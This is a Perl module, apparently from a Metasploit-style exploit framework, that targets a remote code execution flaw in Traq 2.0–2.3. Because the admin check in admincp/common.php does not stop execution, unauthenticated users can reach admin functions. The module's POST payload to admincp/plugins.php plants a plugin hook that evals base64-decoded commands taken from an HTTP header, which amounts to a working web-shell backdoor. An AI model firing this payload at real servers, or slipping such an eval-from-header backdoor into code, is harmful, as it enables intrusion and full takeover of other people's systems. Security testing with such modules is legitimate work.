package TRAQ::MSF::TraqPluginExec;
use lib qw(../../); use parent qw(Exploit);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use File::Slurp qw(read_file);

# # 
# # 
# # 

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   

   my $name = "TraqPluginExec";

   my $DETECTION = {

   };

my $EXPLOIT = {
  DESCRIPTION => "

        This module exploits an arbitrary command execution vulnerability in

        Traq 2.0 to 2.3. It's in the admincp/common.php script.



        This function is called in each script located in the /admicp/ directory to

        make sure the user has admin rights. This is a broken authorization schema

        because the header() function doesn't stop the execution flow.

        This can be exploited by malicious users to execute admin functionality,

        e.g. execution of arbitrary PHP code leveraging of plugins.php functionality.

      ",
  MSF_MODULE => "traq_plugin_exec",
  OSVDB => 77556,
  REFERENCES => ["http://traqproject.org/"],
  TITLE => "Traq admincp/common.php Remote Code Execution",


  TYPE => 'MSF',
  PLATFORM => 'MULTI',
  REQUESTS => {
    EXPLOIT1 => {
      METHOD       => 'POST',
      PATH   => 'admincp/plugins.php',
      PAYLOAD      => 'plugin_id=1&title=1&execorder=0&hook=template_footer&code=error_reporting%280%29%3beval%28base64_decode%28%24_SERVER%5bHTTP_CMD%5d%29%29%3bdie%3b',
      TEXT   => 'Sending Exploit #1 Request : [POST] /admincp/plugins.php',
      HEADERS      => {
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($name, $DETECTION, $EXPLOIT, @_);
}

return 1;
